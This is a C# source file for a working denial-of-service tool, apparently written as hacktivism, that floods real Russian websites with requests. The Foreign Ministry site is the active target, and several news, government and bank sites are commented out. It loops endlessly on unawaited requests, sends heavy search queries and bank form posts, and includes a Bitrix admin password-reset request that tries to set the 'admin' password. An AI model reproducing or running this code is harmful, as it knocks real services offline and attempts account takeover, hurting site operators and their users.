using RushkaDDOS;
using System.Diagnostics;
using System.Net;
using System.Net.NetworkInformation;

namespace Program
{
    public class Program
    {
        private static HttpClient httpClient = new HttpClient();
        private static Stopwatch stopWatch = new Stopwatch();
        private static long requestCount = 0;

        public static async Task Main(string[] args)
        {
            Console.WriteLine("Hello RUSSIAN WARSHIP, GO F*CK YOURSELF!!");

            var targets = new List<string> {
                //"http://cbr.ru",
                //"http://www.interfax.ru",
                //"http://izvestia.ru",
                //"http://life.ru",
                //"http://www.vesti.ru",
                //"https://tass.ru",
                //"http://defence.council.gov.ru",
                //"https://rostov-gorod.ru",
                "https://www.mid.ru/ru/",
                "https://mid.ru/ru/",
                //"194.110.202.47",
                //"194.110.202.181"
            };

            stopWatch.Start();

            while (true)
            {
                foreach (var site in targets)
                    _ = Task.WhenAny(
                        DdosGET(site),
                        DdosMidRu()
                        //DdosÌîéáèçíåñNovosti(),
                        //DdosÌîéáèçíåñReset()
                        );
            }
        }

        async static Task DdosGET(string siteUrl)
        {
            try
            {
                if (IPAddress.TryParse(siteUrl, out var ipAddress))
                {
                    var response = await new Ping().SendPingAsync(ipAddress);

                    Console.WriteLine($"PING: Status:{(int)response.Status}({response.Status}) | IpAddress:{response.Address}");
                }
                else
                {
                    var response = await httpClient.SendAsync(new HttpRequestMessage(HttpMethod.Get, siteUrl));

                    if (response.StatusCode == HttpStatusCode.Moved && response.Headers?.Location?.AbsoluteUri != null)
                        response = await httpClient.SendAsync(new HttpRequestMessage(HttpMethod.Get, response.Headers.Location.AbsoluteUri));

                    Console.WriteLine($"HTTP: StatusCode:{(int)response.StatusCode}({response.StatusCode}) | SiteUrl:{siteUrl}");
                }

                PutStatistic();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        async static Task DdosDigitaleBancaintesa(string siteUrl = "https://digitale.bancaintesa.ru/ru/service/getControlQuestion")
        {
            try
            {
                var request = new HttpRequestMessage(HttpMethod.Post, siteUrl);

                request.Content = new FormUrlEncodedContent(new[]
                {
                    new KeyValuePair<string, string>("login", "jgjf@gmail.com"),
                    new KeyValuePair<string, string>("inn", "hhhhh")
                });

                var response = await httpClient.SendAsync(request);

                if (response.StatusCode == HttpStatusCode.Moved && response.Headers?.Location?.AbsoluteUri != null)
                    response = await httpClient.SendAsync(new HttpRequestMessage(HttpMethod.Get, response.Headers.Location.AbsoluteUri));

                Console.WriteLine($"HTTP: StatusCode:{(int)response.StatusCode}({response.StatusCode}) | SiteUrl:{siteUrl}");

                PutStatistic();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        async static Task DdosÌîéáèçíåñNovosti(string siteUrl = "https://xn--90aifddrld7a.xn--p1ai/novosti")
        {
            try
            {
                var request = new HttpRequestMessage(HttpMethod.Post, siteUrl);

                request.Content = new FormUrlEncodedContent(new[]
                {
                    new KeyValuePair<string, string>("mode", "ajax"),
                    new KeyValuePair<string, string>("next", "true")
                });

                var response = await httpClient.SendAsync(request);

                Console.WriteLine($"HTTP: StatusCode:{(int)response.StatusCode}({response.StatusCode}) | SiteUrl:{siteUrl}");

                PutStatistic();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        async static Task DdosÌîéáèçíåñReset(string siteUrl = "https://ìîéáèçíåñ.ðô/bitrix/admin/?change_password=yes")
        {
            try
            {
                var request = new HttpRequestMessage(HttpMethod.Post, siteUrl);

                request.Content = new FormUrlEncodedContent(new[]
                {
                    new KeyValuePair<string, string>("AUTH_FORM", "Y"),
                    new KeyValuePair<string, string>("TYPE", "CHANGE_PWD"),
                    new KeyValuePair<string, string>("USER_LOGIN", "admin"),
                    new KeyValuePair<string, string>("USER_CHECKWORD", "5765asffjsad"),
                    new KeyValuePair<string, string>("USER_PASSWORD", "123456Qwerty@"),
                    new KeyValuePair<string, string>("USER_CONFIRM_PASSWORD", "123456Qwerty@"),
                    new KeyValuePair<string, string>("captcha_sid", ""),
                    new KeyValuePair<string, string>("captcha_word", ""),
                    new KeyValuePair<string, string>("change_pwd", "Èçìåíèòü ïàðîëü"),
                    new KeyValuePair<string, string>("sessid", "98fde201d4029dd03604ce0d44a7fed1"),
                });

                var response = await httpClient.SendAsync(request);

                Console.WriteLine($"HTTP: StatusCode:{(int)response.StatusCode}({response.StatusCode}) | SiteUrl:{siteUrl}");

                PutStatistic();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        async static Task DdosMidRu(string siteUrl = "https://mid.ru/ru")
        {
            try
            {
                var query = GenerateNameHelper.GenerateName(new Random().Next(1,999));

                siteUrl = siteUrl + $"/search/?q={query}&sort=rele&lang=ru&order=desc&count=10000";

                var request = new HttpRequestMessage(HttpMethod.Get, siteUrl);

                var response = await httpClient.SendAsync(request);

                Console.WriteLine($"HTTP: StatusCode:{(int)response.StatusCode}({response.StatusCode}) | SiteUrl:{siteUrl}");

                PutStatistic();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        static void PutStatistic()
        {
            ++requestCount;

            Console.WriteLine($"INFO: RequestCount:{requestCount} | ElapsedTime:{stopWatch.Elapsed}");
        }
    }
}